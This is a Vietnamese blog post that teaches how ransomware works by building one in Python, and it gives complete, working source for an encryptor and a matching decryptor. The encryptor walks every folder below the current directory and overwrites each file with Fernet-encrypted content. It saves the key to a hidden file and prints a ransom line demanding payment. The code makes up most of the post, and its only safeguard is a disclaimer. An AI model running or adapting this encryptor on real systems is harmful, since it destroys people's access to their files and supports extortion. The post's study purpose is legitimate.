---
title: "Ransomware vô hại nhất trên thế giới"
date: 2024-02-23T17:37:37+07:00
tags:
  - lập trình
  - hack
  - bảo mật
author: "Nam Nguyễn"
description: "Học về ransomware bằng cách làm 1 con ransomware"
---

> **Lưu ý**: **Không** sử dụng phần mềm này cho việc xấu. Phần mềm này được làm cho mục đích học tập. Nếu bạn muốn chạy ransomware này thì chạy nó trong môi trường ảo, môi trường đã được cách ly. **Đừng sử dụng nó cho việc xấu!**

Kể từ khi mình bắt đầu xem phim *Mr. Robot*, mình thấy rất hứng thú với hacker và hack. Mình không phải là hacker nhưng mình rất thích học về các cách hack mà nhiều người khác nghĩ ra.

1 cách hack mà mình thấy rất thú vị là *ransomware*. Phần mềm này có khả năng mã hóa hết các file trên máy tính và tống tiền mình để giải mã các file đó. Với mình thì nó vừa đáng sợ, vừa thú vị.

Trong lúc mình học về ransomware, mình quyết định tự làm 1 con ransomware đơn giản và không có hại mấy để hiểu về ransomware hơn. Vậy nên trong bài đăng này chúng ta sẽ cùng học về ransomware bằng cách lập trình nó!

___

# Ý tưởng đằng sau ransomware
Ransomware sẽ mã hóa hết các file trên máy tính và chỉ giải mã các file đó khi mà hacker cho phép nó giải mã (điều này thường xảy ra sau khi nạn nhân bị hack đã trả tiền cho hacker).

Chúng ta sẽ cần 1 cách để tìm hết các file trên máy tính, mã hóa nó bằng 1 cái key (chìa khóa) giống như khóa bằng móc khóa ngoài đời thật, và giải mã nó bằng key mà mình dùng để mã hóa nó.

___

# Môi trường lập trình
Mình cần dùng *thư viện mã hóa* trong Python để mã hóa và giải mã các file mình tìm đc. Mình sử dụng thư viện có tên là `cryptography` và chúng ta có thể tải thư viện này bằng `pip`.

```bash
pip install cryptography
```

___

# Cách tìm và mã hóa file
Thế làm thế nào để mình mã hóa hết các file trên máy? Đầu tiên thì mình phải tìm được hết các file trên máy tính. Mình sử dụng thư viện `os` của Python để tìm file. Mình cũng sẽ sử dụng thuật toán *Fernet* ở trong thư viện mã hóa mình vừa cài để mã hóa các file.

```py
import os
from cryptography.fernet import Fernet
```

Chúng ta lưu các file trên máy mà chúng ta tìm được trong 1 danh sách gọi là `files`.

Chúng ta cần check xem cái "file" đó là 1 file bình thường hay là 1 folder. Chúng ta có thể dùng hàm `os.path.isfile()` để check. Nếu như "file" đó không phải là file mà là folder thì chúng ta cần đi vào trong folder đó và check các file trong folder đó. Nếu folder đó có folder thì sẽ tiếp tục vào folder trong folder đó.

Sau khi chúng ta tìm đường dẫn của các file, chúng ta sẽ lưu đường dẫn tới các file đó trong danh sách `files`.

Chúng ta cũng cần tránh không lưu chương trình mã hóa, giải mã và key của mình trong lúc tìm kiếm file bởi vì nếu như chúng ta mã hóa file giải mã và file key thì sau này sẽ không giải mã các file được.

```py
# bill-cipher.py
def find_files():
    files = []
	
	for file in os.listdir():
		if file == "bill-cipher.py" or file == ".a_deal" or file == "bill-decipher.py":
			continue
		
		if os.path.isfile(file):
			files.append(file)
		else:
			os.chdir(file)
			sub_files = find_files()
			os.chdir("..")
			for subfile in sub_files:
				path = file + "/" + subfile
				files.append(path)
			
	return files

files = find_files()
```

Tiếp theo, chúng ta cần tạo key để mã hóa các file chương trình của mình đã tìm được. Key này sẽ được lưu trong `.a_deal` (mình lưu trong file thế này bởi vì các file có chấm ở đầu tên file sẽ được ẩn trên các hệ thống Unix).

Sau khi chúng ta tạo key thì chúng ta sẽ cần mở các file bằng đường dẫn mình lưu trong `files`, đọc file và mã hóa nội dung mình đọc được từ file, rồi viết nội dung đã mã hóa vào lại file. Mình đọc và viết ở chế độ nhị phân bởi vì thuật toán Fernet được dùng cho nhị phân.

```py
key = Fernet.generate_key()

with open(".a_deal", "wb") as deal:
	deal.write(key)

for file in files:
	with open(file, "rb") as f:
		content = f.read()

	content_encrypted = Fernet(key).encrypt(content)

	with open(file, "wb") as f:
		f.write(content_encrypted)
```

Thế là xong chương trình mã hóa file (`bill-cipher.py`). Đây là code cho chương trình mã hóa này:

```py
#!/usr/local/bin/python3 

import os
from cryptography.fernet import Fernet

def find_files():
	files = []
	
	for file in os.listdir():
		if file == "bill-cipher.py" or file == ".a_deal" or file == "bill-decipher.py":
			continue
		
		if os.path.isfile(file):
			files.append(file)
		else:
			os.chdir(file)
			sub_files = find_files()
			os.chdir("..")
			for subfile in sub_files:
				path = file + "/" + subfile
				files.append(path)
			
	return files

files = find_files()

print(files)

key = Fernet.generate_key()

with open(".a_deal", "wb") as deal:
	deal.write(key)

for file in files:
	with open(file, "rb") as f:
		content = f.read()

	content_encrypted = Fernet(key).encrypt(content)

	with open(file, "wb") as f:
		f.write(content_encrypted)

print("File đã bị mã hóa! Trả tiền thì sẽ giải mã")
```

Nếu như mình chạy file `bill-cipher.py` thì có thể thấy là các file mà chương trình này tìm được sẽ bị mã hóa và trở thành file chứa 1 đống chữ cái, ký tự random.

![file1-encrypted](/img/harmless-ransomware/file1-encrypted.png)

Chương trình này cũng có thể mã hóa file ảnh và video nữa.

![pic-encrypted](/img/harmless-ransomware/pic-encrypted.png)

Chúng ta biết cách tìm và mã hóa các file trên máy rồi, bây giờ chúng ta cần cách giải mã các file đó.

___

# Cách giải mã
Để giải mã các file bị mã hóa, chúng ta sẽ cần tìm các file đó trước. Thế nên chúng ta sẽ dùng đoạn code tìm file của chương trình mã hóa trên.

Sau khi tìm được file, chúng ta cần đọc key trong `.a_deal` để giải mã các file bị mã hóa bằng key này.

```py
with open(".a_deal", "rb") as deal:
	key = deal.read()
```

Chúng ta sẽ đọc nội dung file ở chế độ nhị phân, giải mã bằng key trong `.a_deal` và viết nội dung đã giải mã vào lại file đó.

```py
for file in files:
	with open(file, "rb") as f:
		content = f.read()

	content_decrypted = Fernet(key).decrypt(content)

	with open(file, "wb") as f:
		f.write(content_decrypted)
```

Thế là xong chương trình giải mã file (`bill-cipher.py`). Đây là code cho chương trình giải mã này:

```py
#!/usr/local/bin/python3 

import os
from cryptography.fernet import Fernet

def find_files():
	files = []
	
	for file in os.listdir():
		if file == "bill-cipher.py" or file == ".a_deal" or file == "bill-decipher.py":
			continue
		
		if os.path.isfile(file):
			files.append(file)
		else:
			os.chdir(file)
			sub_files = find_files()
			os.chdir("..")
			for subfile in sub_files:
				path = file + "/" + subfile
				files.append(path)
			
	return files

files = find_files()

print(files)

with open(".a_deal", "rb") as deal:
	key = deal.read()

for file in files:
	with open(file, "rb") as f:
		content = f.read()

	content_decrypted = Fernet(key).decrypt(content)

	with open(file, "wb") as f:
		f.write(content_decrypted)

print("File đã được giải mã!")
```

Sau khi chúng ta chạy chương trình này, chúng ta có thể đọc lại nội dung gốc của các file đã bị mã hóa.

![file1-decrypted](/img/harmless-ransomware/file1-decrypted.png)

Chúng ta cũng có thể xem lại các file ảnh và video.

![pic-decrypted](/img/harmless-ransomware/pic-decrypted.png)

___

# Kết luận
Đó là 2 chương trình mã hóa và giải mã. 2 chương trình đó sẽ kết hợp lại thành 1 con *ransomware*. Đây chỉ là con ransomware rất đơn giản và vô hại, nếu như nạn nhân có 1 ít kiến thức về mã hóa và giải mã thì họ sẽ không có vấn đề gì trong việc giải mã các file bị mã hóa.

Nhưng lõi của con ransomware cũng giống như lõi của các con ransomware khác: Khả năng *tìm* và *mã hóa* các file trên máy tính và khả năng *giải mã* các file đó.

Đó là cách vận hành của mọi ransomware.

> Bạn có thể đọc mã nguồn của dự án này tại [đây](https://github.com/namberino/simple-ransomware)
